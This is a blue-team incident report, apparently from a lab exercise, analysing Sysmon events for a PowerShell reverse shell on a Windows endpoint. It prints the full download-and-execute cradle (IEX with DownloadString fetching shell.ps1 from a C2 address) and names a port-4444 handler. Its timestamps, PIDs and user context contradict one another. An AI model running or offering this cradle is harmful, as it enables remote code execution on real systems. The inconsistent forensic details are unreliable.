# 🛡️ Blue Team Incident Investigation Report: CASE-001

## 📊 Executive Summary
* **Incident ID:** INC-2026-001
* **Severity:** Critical 🔴
* **Assigned Analyst:** Security Operations Center (SOC)
* **Target Endpoint:** `DESKTOP`
* **Operating System:** Windows 11 Enterprise
* **Logged Network Users:** `shadow` / Local Administrator
* **Primary Detection Mechanism:** Sysmon Operational Log (Event ID 1 & Event ID 3)

On June 11, 2026, a high-severity incident was identified on endpoint `DESKTOP`. Forensic analysis of Microsoft Sysmon logs confirmed an unauthorized interactive execution flow where a native administrative binary was manipulated into establishing a fileless reverse shell back to an external rogue Command and Control (C2) server. This repository documents the end-to-end telemetry lifecycle confirming the initial process execution phase, outbound socket handshakes, and ultimate process termination.

---

## 📅 Forensic Timeline (Chronological)
Timestamps are correlated from native Event Tracing for Windows (ETW) system logging events. Note that underlying logs track internal actions in UTC while system views reflect local runtime variations across test sessions:

| Timestamp (Local/UTC) | Event ID | Provider | Description |
| :--- | :--- | :--- | :--- |
| **02:13:44 PM** | **Event ID 1** | Sysmon | Malicious `powershell.exe` spawned (**PID 17092**); processes inline staging download string. |
| **10:45:19 PM** | **Event ID 3** | Sysmon | Outbound TCP socket successfully established by `powershell.exe` (**PID 20716**) to external C2 infrastructure. |
| **02:13:47 PM** | **Event ID 5** | Sysmon | Target malicious execution process context (**PID 17092**) explicitly terminated / closed. |

---

## 🔍 Technical Root Cause & Behavioral Analysis

The adversary bypassed traditional signature-based static file detections by leveraging a **Living-off-the-Land (LotL)** technique. Rather than writing a compiled executable payload directly onto the victim's hard drive, the attacker used a built-in, trusted Windows administrative binary (`powershell.exe`) to ingest and execute code purely in volatile memory space.

### 💻 1. Process Spawn Analysis (Event ID 1)
* **Parent Image:** `C:\Windows\explorer.exe` (Indicates execution initiated via interactive user desktop environment).
* **Target Image:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **Process ID (PID):** `17092`
* **User Context:** `SYSTEM` / Elevated local access
* **Full Command Line Exploit:**
  ```powershell
  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object Net.WebClient).DownloadString('[http://192.168.247.133:8000/shell.ps1](http://192.168.247.133:8000/shell.ps1)')"
## 🌐 2. Network Communication Verification (Event ID 3)
Forensic correlation of Sysmon Event ID 3 conclusively verified network egress matching active C2 signaling behaviors:

Initiating Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Process ID (PID): 20716

Source Internal Host: 192.168.247.1 (Utilizing local ephemeral port 60890)

Target Rogue C2 Handler: 192.168.247.133

Target Destination Port: 4444 (Raw outbound TCP handshake connection)

## 🛑 3. Session Lifecycle Tracking (Event ID 5)
Terminated Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Process ID (PID): 17092

Termination Impact: Marks the formal termination of the localized exploit thread, either via direct attacker session disconnect or background sockets dropping.
